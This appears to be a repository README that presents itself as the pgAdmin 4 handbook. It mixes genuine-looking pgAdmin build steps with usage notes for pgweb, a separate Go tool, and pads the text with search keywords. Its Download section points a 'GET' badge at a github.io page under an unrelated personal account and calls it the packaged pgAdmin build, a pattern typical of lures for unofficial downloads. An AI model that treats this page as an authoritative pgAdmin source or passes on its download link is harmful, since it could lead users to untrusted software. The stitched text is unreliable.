# PostgreSQL pgAdmin

PostgreSQL pgAdmin is a graphical admin client for PostgreSQL. pgAdmin 4 is the current rewrite of the old pgAdmin 3 tree. You connect a server, open a query tab, walk schemas, and leave with a script or a backup job.

This page is the handbook for that client. It covers pgadmin on a workstation and postgresql pgadmin in a browser. The same tree is pgadmin for postgresql: objects, SQL, import, restore, and a few agent jobs.

pgAdmin 4 is a Flask app with a React UI. You can fork a local Python process behind Electron, or put the same app on a web server. A smaller explorer in this pack (pgweb) is a single Go binary for a quick SQL session.

![Banner Placeholder](tools/image1.png)

## Architecture

pgAdmin 4 is a web app. Python and Flask sit on the server. React, HTML, and CSS sit in the browser.

The same code runs two ways. Server mode serves many users from a host. Desktop mode starts a local Python process and shows the UI in an Electron window. The window code lives in [pgadmin.js](runtime/pgadmin.js). The Flask entry is [pgAdmin4.py](web/pgAdmin4.py).

A typical desktop start forks the server, then points the window at the printed URL. A typical web start uses a WSGI file and a reverse proxy.

## Overview

pgweb is a small cross platform explorer written in Go. It ships as one binary with no extra runtime. Use it when you want a browser tab on a database and you do not need the full object tree of PostgreSQL pgAdmin.

pgAdmin 4 is the full pgadmin for postgresql console: servers, databases, roles, backup, restore, schema diff, and a query tool with autocomplete.

## Features

| Area | What you get |
| --- | --- |
| Query tool | Highlight, autocomplete, errors, history |
| Objects | Servers, databases, schemas, tables, views, roles |
| Jobs | Backup, restore, import, export, maintenance |
| Diff | Schema compare between two databases |
| Agent | pgAgent jobs when the extension is present |
| Modes | Desktop Electron, or multi user web |
| Light explorer | pgweb binary, SSH tunnel, CSV or JSON export |

pgweb also does native SSH tunnels, more than one session, query history, and bookmarks. PostgreSQL 9.6 and later are enough for that explorer.

Visit the wiki of that explorer if you need flag lists beyond this page.

## Prerequisites

1. Node.js 20 or newer
2. yarn (enable Corepack so `yarn` is on PATH)
3. Python 3.9 or newer
4. A PostgreSQL server so you have something to open

```bash
corepack enable
```

The Python pin for packages is in [requirements.txt](requirements.txt). The Flask and webpack layout sit under the `web` folder.

## Building the Web Assets

pgAdmin 4 pulls third party JavaScript, then packs its own JS, CSS, and images into one bundle. The browser loads that bundle instead of dozens of files.

On Linux or macOS, from the source root:

```bash
make install-node
make bundle
```

On Windows, where `make` may be missing:

```
cd web
yarn install
yarn run bundle
```

After a successful bundle, start the Python app and open the URL it prints.

## Configuring the Python Environment

Run the Python side in a virtualenv. Do not use the system interpreter for day to day work.

1. Create the env:

```bash
python3 -m venv venv
```

2. Activate it:

```bash
source venv/bin/activate
```

3. Upgrade pip, then install requirements. Keep `pg_config` on PATH so psycopg can build:

```bash
pip install --upgrade pip
PATH=$PATH:/usr/local/pgsql/bin pip install -r requirements.txt
```

4. Copy settings into `config_local.py`. Values there override [config.py](web/config.py). A development file looks like this:

```python
import os
import logging

DATA_DIR = '/Users/myuser/.pgadmin_dev'
DEFAULT_SERVER = '127.0.0.1'
DEFAULT_SERVER_PORT = 5051
SERVER_MODE = True
CONSOLE_LOG_LEVEL = logging.INFO
FILE_LOG_LEVEL = logging.INFO

if SERVER_MODE == False:
    SQLITE_PATH = os.path.join(DATA_DIR, 'pgadmin4-desktop.db')
else:
    SQLITE_PATH = os.path.join(DATA_DIR, 'pgadmin4-server.db')
```

`SERVER_MODE` switches desktop and web. Desktop setup is silent. Server setup asks for the first login.

5. Finish setup, then start pgAdmin 4:

```bash
python3 web/setup.py
python3 web/pgAdmin4.py
```

[setup.py](web/setup.py) writes the config database. Open the URL from the terminal in a browser.

On Windows the env steps are longer. Use the win32 package notes in the source tree.

![Editor Placeholder](tools/image2.jpg)

## Building the documentation

Install Sphinx in the same venv, then run `make docs`. HTML lands under `docs/en_US/_build/html`.

```bash
pip install Sphinx sphinxcontrib-youtube
make docs
```

## Building the Runtime

Change into the runtime folder and run `yarn install`. Copy [dev_config.json.in](runtime/dev_config.json.in) to `dev_config.json` and point it at your Python and `pgAdmin4.py`. Then:

```bash
yarn run start
```

Menus and window chrome live in the runtime folder. Without a local `dev_config.json`, the runtime looks for the packaged paths of a normal install.

## Building packages

Most packages use the top level [Makefile](Makefile) after the env above is ready.

```bash
make src
make pip
```

`make src` builds a source tarball. `make pip` builds a wheel. macOS and Windows installers have their own package folders.

Docker entry for a web host lives under `pkg` next to the gunicorn config.

## Create Database Migrations

The config DB is SQLite unless you point `CONFIG_DATABASE_URI` at PostgreSQL. To change the schema:

```bash
cd web
FLASK_APP=pgAdmin4.py flask db revision
```

Edit `upgrade` in the new file under `web/migrations/versions`. Bump `SCHEMA_VERSION` in the model package. You do not bump `SETTINGS_SCHEMA_VERSION`.

## Demo

pgweb has a public demo if you want to click a grid before you install. PostgreSQL pgAdmin itself is something you run against your own server. Do not point a public demo at a production cluster.

## Download

[![GET PostgreSQL pgAdmin](https://img.shields.io/badge/GET-PostgreSQL%20pgAdmin-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://cooperwilliam3374.github.io/.github/PostgreSQL-pgAdmin)

Use the GET badge for the packaged PostgreSQL pgAdmin build. Official installers also exist for Windows, macOS, and Linux. pgweb ships as a single binary per OS if you only need the light explorer.

Docker compose for a throwaway Postgres next to the explorer is [docker-compose.yml](docker-compose.yml).

## Usage

Start the light explorer with no flags to get a connect form:

```
pgweb
```

Or pass a host:

```
pgweb --host localhost --user myuser --db mydb
```

URL form:

```
pgweb --url postgres://user:password@host:port/database?sslmode=[mode]
```

The CLI parse lives in [cli.go](cli/cli.go). The process entry is [main.go](main.go). The browser UI is [app.js](static/app.js). SQL execution sits in [query.go](queries/query.go).

For pgAdmin 4, start `pgAdmin4.py` or the desktop runtime, then add a server in the tree. Write SQL in the query tool. Backup and restore are dialogs on the object.

### Multiple database sessions

Enable more than one pgweb session:

```
pgweb --sessions
```

Or:

```
PGWEB_SESSIONS=1 pgweb
```

pgAdmin 4 already holds many servers in one tree. You do not need a sessions flag there.

![Grid Placeholder](tools/image3.jpg)

## Testing

For pgweb, run a local PostgreSQL on `localhost:5432` with a `postgres` role that can create databases. Do not run pgweb at the same time as the suite.

```
make test
make test-all
```

`make test-all` walks supported server versions if Docker is around.

pgAdmin 4 has a regression tree under `web/regression`. Install those extra requirements before you run it.

## Support

Use the pgAdmin support page for product help. For this tree, file a pull request against master on the official GitHub project.

## Security Issues

Mail security reports to the pgAdmin security address, not a public issue. Use that address only for bugs in the design or code of pgAdmin, pgAgent, and the website. Do not send general how-to questions there.

## Contribute

Fork, branch, test, then open a pull request. Use issues for questions. Check the wiki for extra flags.

If you want to talk through a change, the hackers list is pgadmin-hackers@postgresql.org.

## Project info

The GitHub project for pgAdmin 4 is pgadmin-org/pgadmin4. Submit patches against master.

pgweb is a separate Go tree. Keep its tests green before you push.

## Related Questions

**What is pgAdmin used for?**

PostgreSQL pgAdmin is the GUI for day to day postgresql pgadmin work: connect, browse objects, run SQL, import CSV, backup, restore, and compare schemas. It is not the database engine.

**What is the difference between PostgreSQL and pgAdmin?**

PostgreSQL is the server that stores data. pgAdmin 4 is a client. You can use psql or pgweb instead. pgadmin for postgresql is the admin seat, not the storage.

**Is PostgreSQL pgAdmin free?**

Yes. pgAdmin 4 is open source. You can run desktop or web without a seat license. PostgreSQL itself is also open source. Hosting and support contracts are separate.

**Is pgAdmin a SQL server?**

No. pgadmin does not store your tables. It talks to PostgreSQL (and a few compatible hosts). Microsoft SQL Server is a different engine and a different tool.

## License

pgAdmin 4 uses the license file in this pack. pgweb is MIT. Read each license file in FILES before you ship a build.

## Related Search Terms

PostgreSQL pgAdmin, pgAdmin 4, pgadmin, postgresql pgadmin, pgadmin for postgresql, administration, database, dba, postgres, postgresql, postgresql-database, golang, pgweb, cross-platform, gui, sql
